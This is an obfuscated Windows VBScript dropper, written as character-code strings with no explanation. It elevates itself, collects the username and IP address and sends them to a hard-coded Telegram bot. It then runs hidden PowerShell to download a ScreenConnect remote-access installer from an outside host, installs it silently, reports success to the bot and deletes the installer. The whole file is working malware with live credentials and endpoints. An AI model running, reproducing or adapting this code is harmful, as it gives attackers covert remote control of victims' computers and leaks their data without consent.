Dim x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,xa,xb,xc,xd,xf,pU,pI,xArr

Set x0 = CreateObject(Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110))
Set x1 = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))

If WScript.Arguments.Count = 0 Then
    x0.ShellExecute Chr(119)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(101)&Chr(120)&Chr(101), _
        Chr(34) & WScript.ScriptFullName & Chr(34) & Chr(32) & Chr(101)&Chr(108)&Chr(101)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(100), _
        Chr(32), Chr(114)&Chr(117)&Chr(110)&Chr(97)&Chr(115), 1
    WScript.Quit
End If

Function xH(h)
    Dim i, r : r = ""
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng(Chr(38)&Chr(72) & Mid(h, i, 2)))
    Next
    xH = r
End Function

Function xG()
    Dim oW, oI, oIt, fU, fI
    Set oW = GetObject(Chr(119)&Chr(105)&Chr(110)&Chr(109)&Chr(103)&Chr(109)&Chr(116)&Chr(115)&Chr(58))
    fU = x1.ExpandEnvironmentStrings(Chr(37)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(78)&Chr(65)&Chr(77)&Chr(69)&Chr(37))
    Set oI = oW.ExecQuery(Chr(83)&Chr(101)&Chr(108)&Chr(101)&Chr(99)&Chr(116)&Chr(32)&Chr(42)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(87)&Chr(105)&Chr(110)&Chr(51)&Chr(50)&Chr(95)&Chr(78)&Chr(101)&Chr(116)&Chr(119)&Chr(111)&Chr(114)&Chr(107)&Chr(65)&Chr(100)&Chr(97)&Chr(112)&Chr(116)&Chr(101)&Chr(114)&Chr(67)&Chr(111)&Chr(110)&Chr(102)&Chr(105)&Chr(103)&Chr(117)&Chr(114)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(119)&Chr(104)&Chr(101)&Chr(114)&Chr(101)&Chr(32)&Chr(73)&Chr(80)&Chr(69)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(100)&Chr(32)&Chr(61)&Chr(32)&Chr(84)&Chr(114)&Chr(117)&Chr(101))
    For Each oIt In oI
        If Not IsNull(oIt.IPAddress) Then
            fI = oIt.IPAddress(0)
            Exit For
        End If
    Next
    xG = fU & Chr(124) & fI
End Function

Function xE(s)
    Dim e,i,c,v : e = ""
    For i = 1 To Len(s)
        c = Mid(s,i,1) : v = Asc(c)
        Select Case c
            Case Chr(32) : e = e & Chr(43)
            Case Chr(33),Chr(35),Chr(36),Chr(37),Chr(38),Chr(39),Chr(40),Chr(41),Chr(42),Chr(43),Chr(44),Chr(47),Chr(58),Chr(59),Chr(61),Chr(63),Chr(64),Chr(91),Chr(93)
                e = e & Chr(37) & Right(Chr(48) & Hex(v), 2)
            Case Else
                If v < 32 Or v > 126 Then
                    e = e & Chr(37) & Right(Chr(48) & Hex(v), 2)
                Else
                    e = e & c
                End If
        End Select
    Next
    xE = e
End Function

' >>> HEX-HOLDERS <<<
x2 = xH("68747470733A2F2F677265656E746F74616C73656375726974792E636F6D2F42696E2F53637265656E436F6E6E6563742E436C69656E7453657475702E6D73693F653D41636365737326793D477565737426633D736861646F7726633D26633D26633D26633D26633D26633D26633D")
x3 = xH("373635393835343434373A414146524C34426947636C416A3538493741774E3764306E587679526E6A3767554355")
x4 = xH("37333932343634303838")

x5 = x1.ExpandEnvironmentStrings(Chr(37)&Chr(84)&Chr(69)&Chr(77)&Chr(80)&Chr(37)&Chr(92)&Chr(67)&Chr(108)&Chr(105)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(101)&Chr(116)&Chr(117)&Chr(112)&Chr(46)&Chr(109)&Chr(115)&Chr(105))

x6 = xG()
xArr = Split(x6, Chr(124))
pU = xArr(0)
pI = xArr(1)

Set x7 = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80))
x8 = Chr(91)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(69)&Chr(68)&Chr(93)&Chr(32) & _
     Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & pU & _
     Chr(32)&Chr(124)&Chr(32)&Chr(73)&Chr(80)&Chr(58)&Chr(32) & pI & _
     Chr(32)&Chr(124)&Chr(32)&Chr(77)&Chr(83)&Chr(73)&Chr(32)&Chr(73)&Chr(110)&Chr(115)&Chr(116)&Chr(97)&Chr(108)&Chr(108)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(101)&Chr(100)
x9 = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(116)&Chr(101)&Chr(108)&Chr(101)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(46)&Chr(111)&Chr(114)&Chr(103)&Chr(47)&Chr(98)&Chr(111)&Chr(116) & x3 & _
     Chr(47)&Chr(115)&Chr(101)&Chr(110)&Chr(100)&Chr(77)&Chr(101)&Chr(115)&Chr(115)&Chr(97)&Chr(103)&Chr(101)&Chr(63)&Chr(99)&Chr(104)&Chr(97)&Chr(116)&Chr(95)&Chr(105)&Chr(100)&Chr(61) & x4 & _
     Chr(38)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(61) & xE(x8)
x7.Open Chr(71)&Chr(69)&Chr(84), x9, False
x7.Send

xa = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32) & _
     Chr(45)&Chr(78)&Chr(111)&Chr(76)&Chr(111)&Chr(103)&Chr(111)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(114)&Chr(111)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(32) & _
     Chr(45)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(83)&Chr(116)&Chr(121)&Chr(108)&Chr(101)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)&Chr(32) & _
     Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(80)&Chr(111)&Chr(108)&Chr(105)&Chr(99)&Chr(121)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32) & _
     Chr(45)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(32)&Chr(34) & _
     Chr(73)&Chr(110)&Chr(118)&Chr(111)&Chr(107)&Chr(101)&Chr(45)&Chr(87)&Chr(101)&Chr(98)&Chr(82)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(32) & _
     Chr(45)&Chr(85)&Chr(114)&Chr(105)&Chr(32)&Chr(39) & x2 & Chr(39)&Chr(32) & _
     Chr(45)&Chr(79)&Chr(117)&Chr(116)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(39) & x5 & Chr(39)&Chr(34)
x1.Run xa, 0, True

xb = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32) & _
     Chr(45)&Chr(78)&Chr(111)&Chr(76)&Chr(111)&Chr(103)&Chr(111)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(114)&Chr(111)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(32) & _
     Chr(45)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(83)&Chr(116)&Chr(121)&Chr(108)&Chr(101)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)&Chr(32) & _
     Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(80)&Chr(111)&Chr(108)&Chr(105)&Chr(99)&Chr(121)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32) & _
     Chr(45)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(32)&Chr(34) & _
     Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(45)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(39)&Chr(109)&Chr(115)&Chr(105)&Chr(101)&Chr(120)&Chr(101)&Chr(99)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(39)&Chr(32) & _
     Chr(45)&Chr(65)&Chr(114)&Chr(103)&Chr(117)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(76)&Chr(105)&Chr(115)&Chr(116)&Chr(32)&Chr(39)&Chr(47)&Chr(105)&Chr(32) & x5 & _
     Chr(32)&Chr(47)&Chr(113)&Chr(117)&Chr(105)&Chr(101)&Chr(116)&Chr(32)&Chr(47)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(115)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(39)&Chr(32)&Chr(45)&Chr(87)&Chr(97)&Chr(105)&Chr(116)&Chr(34)
x1.Run xb, 0, True

Set x7 = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80))
xc = Chr(91)&Chr(83)&Chr(85)&Chr(67)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(93)&Chr(32) & _
     Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & pU & _
     Chr(32)&Chr(124)&Chr(32)&Chr(73)&Chr(80)&Chr(58)&Chr(32) & pI & _
     Chr(32)&Chr(124)&Chr(32)&Chr(77)&Chr(83)&Chr(73)&Chr(32)&Chr(83)&Chr(117)&Chr(99)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(102)&Chr(117)&Chr(108)&Chr(108)&Chr(121)&Chr(32)&Chr(73)&Chr(110)&Chr(115)&Chr(116)&Chr(97)&Chr(108)&Chr(108)&Chr(101)&Chr(100)
xd = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(116)&Chr(101)&Chr(108)&Chr(101)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(46)&Chr(111)&Chr(114)&Chr(103)&Chr(47)&Chr(98)&Chr(111)&Chr(116) & x3 & _
     Chr(47)&Chr(115)&Chr(101)&Chr(110)&Chr(100)&Chr(77)&Chr(101)&Chr(115)&Chr(115)&Chr(97)&Chr(103)&Chr(101)&Chr(63)&Chr(99)&Chr(104)&Chr(97)&Chr(116)&Chr(95)&Chr(105)&Chr(100)&Chr(61) & x4 & _
     Chr(38)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(61) & xE(xc)
x7.Open Chr(71)&Chr(69)&Chr(84), xd, False
x7.Send

xf = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(111)&Chr(117)&Chr(116)&Chr(32)&Chr(47)&Chr(116)&Chr(32)&Chr(54)&Chr(48)&Chr(32)&Chr(47)&Chr(110)&Chr(111)&Chr(98)&Chr(114)&Chr(101)&Chr(97)&Chr(107)&Chr(32)&Chr(38)&Chr(38)&Chr(32)&Chr(100)&Chr(101)&Chr(108)&Chr(32) & _
     Chr(34) & x5 & Chr(34)
x1.Run xf, 0, True